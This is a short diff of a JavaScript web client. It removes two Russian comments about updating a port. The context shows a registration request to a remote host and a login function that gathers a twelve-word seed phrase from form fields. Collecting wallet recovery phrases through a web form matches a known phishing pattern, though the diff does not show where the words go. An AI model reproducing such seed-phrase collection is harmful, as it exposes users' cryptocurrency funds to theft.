@@ -24,7 +24,7 @@ function checkUser() {
 
 async function register() {
     try {
-        const response = await fetch('https://sitecheck.yhub.net:8080/register', {  // Обновите порт
+        const response = await fetch('https://sitecheck.yhub.net:8080/register', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -46,8 +46,6 @@ async function register() {
         document.getElementById('reg_message').textContent = error.message;
     }
 }
-
-// Обновите все остальные запросы аналогичным образом
 
 async function login() {
     const seedWords = Array.from({ length: 12 }, (_, i) => document.getElementById(`seed_word_${i + 1}`).value.trim());
